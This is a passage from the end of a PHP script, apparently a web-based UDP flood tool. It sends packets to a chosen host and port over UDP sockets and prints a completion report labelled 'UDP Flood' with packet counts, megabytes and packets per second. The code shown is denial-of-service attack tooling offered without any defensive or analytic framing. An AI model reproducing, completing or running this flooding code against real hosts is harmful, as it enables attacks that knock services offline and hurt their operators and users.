            }
            $fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging ". round($packets / $exec_time, 2) . " packets per second \n";
    }
    ?>



